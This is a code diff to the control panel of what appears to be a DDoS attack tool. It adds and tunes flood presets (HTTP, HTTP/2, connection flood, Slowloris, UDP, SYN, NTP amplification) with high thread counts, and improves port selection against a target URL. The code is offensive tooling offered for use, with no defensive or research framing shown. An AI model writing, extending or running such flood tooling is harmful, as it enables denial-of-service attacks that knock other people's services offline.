@@ -51,7 +51,8 @@ function getSmartMethod(baseMethod: string, nodeIdx: number): string {
 const PRESETS: Preset[] = [
   { label: "Quick Strike",   method: "http-flood",     packetSize: 64,   duration: 60,  delay: 0,   threads: 80,   icon: "⚡" },
   { label: "H2 Barrage",     method: "http2-flood",    packetSize: 512,  duration: 90,  delay: 0,   threads: 40,   icon: "⚛" },
-  { label: "Slowloris",      method: "slowloris",      packetSize: 32,   duration: 300, delay: 0,   threads: 16,   icon: "🥷" },
+  { label: "Conn Flood",     method: "conn-flood",     packetSize: 64,   duration: 300, delay: 0,   threads: 50,   icon: "🔌" },
+  { label: "Slowloris",      method: "slowloris",      packetSize: 32,   duration: 300, delay: 0,   threads: 50,   icon: "🥷" },
   { label: "UDP Hammer",     method: "udp-flood",      packetSize: 1024, duration: 120, delay: 0,   threads: 300,  icon: "💥" },
   { label: "SYN Flood",      method: "syn-flood",      packetSize: 40,   duration: 90,  delay: 0,   threads: 400,  icon: "🔨" },
   { label: "NTP Nuclear",    method: "ntp-amp",        packetSize: 46,   duration: 60,  delay: 0,   threads: 600,  icon: "☢️" },
@@ -560,10 +561,15 @@ function Panel() {
       return;
     }
 
-    const port = method.includes("http") || method === "geass-override" || L4_UDP_FE.has(method) ? 80 : method.includes("dns") ? 53 : 443;
+    // Auto-detect port: HTTPS targets → 443, DNS → 53, else 80
+    const isHttpsTarget = /^https:/i.test(target.trim());
+    const portFromTarget = (() => {
+      try { const u = new URL(target.trim()); return parseInt(u.port, 10) || (u.protocol === "https:" ? 443 : 80); } catch { return isHttpsTarget ? 443 : 80; }
+    })();
+    const port = method.includes("dns") ? 53 : portFromTarget;
     if (method === "geass-override") {
       addLog(`👁 ABSOLUTE GEASS COMMAND — target: ${target}`, "info");
-      addLog(`  Triple-vector: HTTP flood + TCP flood + UDP flood | Threads: ${threads} | Duration: ${duration}s`, "info");
+      addLog(`  QUAD-vector: Conn Flood + Slowloris + HTTP/2 + UDP | ${threads} threads | ${duration}s`, "info");
     } else {
       addLog(`👁 Geass granted — target: ${target}`, "info");
       addLog(`  Vector: ${method.toUpperCase()} | Threads: ${threads} | Duration: ${duration}s`, "info");
